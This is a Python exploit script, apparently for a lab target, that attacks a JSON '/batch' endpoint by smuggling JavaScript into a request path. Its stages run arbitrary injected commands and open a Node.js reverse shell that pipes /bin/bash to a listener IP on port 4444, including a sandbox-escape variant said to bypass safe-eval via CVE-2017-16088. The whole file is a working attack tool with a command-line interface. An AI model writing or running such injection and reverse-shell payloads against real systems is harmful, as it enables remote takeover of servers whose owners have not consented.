import sys
import re
import os
import hashlib
import requests
import threading
import urllib.parse
import argparse
import zipfile
import time
import string
import itertools
import warnings
from io import BytesIO
from bs4 import BeautifulSoup
from colorama import Fore, Style

warnings.filterwarnings("ignore")
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def format_text(title, item):
    text = Style.BRIGHT + Fore.RED + title + Style.RESET_ALL + ': ' + str(item)
    return text

def test_request(ip):
    url = "http://{}:8080/batch".format(ip)
    req_1 = '{"method":"get","path":"/profile"}'
    req_2 = '{"method":"get","path":"/item"}'
    req_3 = '{"method":"get","path":"/item/$1.id"}'
    json = '{"requests":[%s,%s,%s]}' % (req_1, req_2, req_3)

    r = requests.post(url, json, proxies=proxies)
    print("[+] Perform a test request to the target vulnerable path...")
    print(format_text('r.text', r.text))

def inject_command(ip, command):
    url = "http://{}:8080/batch".format(ip)
    req_1 = '{"method":"get","path":"/profile"}'
    req_2 = '{"method":"get","path":"/item"}'
    req_3 = '{"method":"get","path":"/item/$1.id;%s;"}' % command
    json = '{"requests":[%s,%s,%s]}' % (req_1, req_2, req_3)

    r = requests.post(url, json, proxies=proxies)
    print("[+] Perform a test request to the target vulnerable path...")
   
def get_reverse_shell(ip, listener_ip):
    print("[+] Triggering the reverse shell...")
    bin_bash_path = "\\\\x2fbin\\\\x2fbash"
    shell = 'var net = require(\'net\'),sh = require(\'child_process\').exec(\'%s\'); ' % bin_bash_path
    shell += 'var client = new net.Socket(); '
    shell += 'client.connect(4444, \'%s\', function() {client.pipe(sh.stdin);sh.stdout.pipe(client);' % listener_ip
    shell += 'sh.stderr.pipe(client);});' 

    url = "http://{}:8080/batch".format(ip)
    req_1 = '{"method":"get","path":"/profile"}'
    req_2 = '{"method":"get","path":"/item"}'
    req_3 = '{"method":"get","path":"/item/$1.id;%s;"}' % shell
    json = '{"requests":[%s,%s,%s]}' % (req_1, req_2, req_3)

    r = requests.post(url, json, proxies=proxies)
    if r.status_code == 200:
        print("[+] The status code is {}, the injection is probably successful.".format(str(r.status_code)))
    else:
        print("[+] The status code is {}, the injection might be failed.".format(str(r.status_code)))


def get_reverse_shell_harden(ip, listener_ip):
    print("[+] Triggering the reverse shell...")
    bin_bash_path = "\\\\x2fbin\\\\x2fbash"
    shell = "process = parts.constructor.constructor('return (function(){return process})()')();var require = process.mainModule.require;"
    shell += 'var net = require(\'net\'),sh = require(\'child_process\').exec(\'%s\'); ' % bin_bash_path
    shell += 'var client = new net.Socket(); '
    shell += 'client.connect(4444, \'%s\', function() {client.pipe(sh.stdin);sh.stdout.pipe(client);' % listener_ip
    shell += 'sh.stderr.pipe(client);});' 

    url = "http://{}:8080/batch".format(ip)
    req_1 = '{"method":"get","path":"/profile"}'
    req_2 = '{"method":"get","path":"/item"}'
    req_3 = '{"method":"get","path":"/item/$1.id;%s;"}' % shell
    json = '{"requests":[%s,%s,%s]}' % (req_1, req_2, req_3)

    r = requests.post(url, json, proxies=proxies)
    if r.status_code == 200:
        print("[+] The status code is {}, the injection is probably successful.".format(str(r.status_code)))
    else:
        print("[+] The status code is {}, the injection might be failed.".format(str(r.status_code)))

class NewlineFormatter(argparse.RawTextHelpFormatter):
    def _split_lines(self, text, width):
        if text.startswith('R|'):
            return text[2:].splitlines()  
        return argparse.RawTextHelpFormatter._split_lines(self, text, width)

def main():
    parser = argparse.ArgumentParser(description='''
    Usage examples:
      - To execute JavaScript command:
        python script.py -i <IP> -s inject_command -c <some JS command>
      - To get a reverse shell:
        python script.py -i <IP> -s get_reverse_shell -l <Listener IP>

    The script supports the following stages:
      - "inject_command": Inject and execute JavaScript command
      - "get_reverse_shell": Get a reverse shell by injecting reverse shell payload
      - "get_reverse_shell_harden": Get a reverse shell from the harden eval() which uses safe-eval. Bypass it with CVE-2017-16088
    ''', formatter_class=NewlineFormatter)
    parser.add_argument('-i', '--ip', type=str, required=True, help='IP Address is mandatory')
    parser.add_argument('-s', '--stage', type=str, help='Stage')
    parser.add_argument('-c', '--command', type=str, help='JavaScript command injection')
    parser.add_argument('-l', '--listener', type=str, help='Listener IP')
    args = parser.parse_args()
    
    if not args.ip:
        parser.print_usage()
        exit(1)

    if args.stage == "inject_command" and not args.command:
        parser.print_usage()
        exit(1)

    if (args.stage == "get_reverse_shell" or args.stage == "get_reverse_shell_harden") and not args.listener:
        parser.print_usage()
        exit(1)

    elif args.ip and args.stage:
        ip = args.ip
        stage = args.stage

        if stage == "test_request":
            test_request(ip)

        elif stage == "inject_command":
            command = args.command
            inject_command(ip, command)

        elif stage == "get_reverse_shell":
            listener_ip = args.listener
            get_reverse_shell(ip, listener_ip)

        elif stage == "get_reverse_shell_harden":
            listener_ip = args.listener
            get_reverse_shell_harden(ip, listener_ip)

    else:
        test_request(ip)
    

if __name__ == "__main__":
    main()
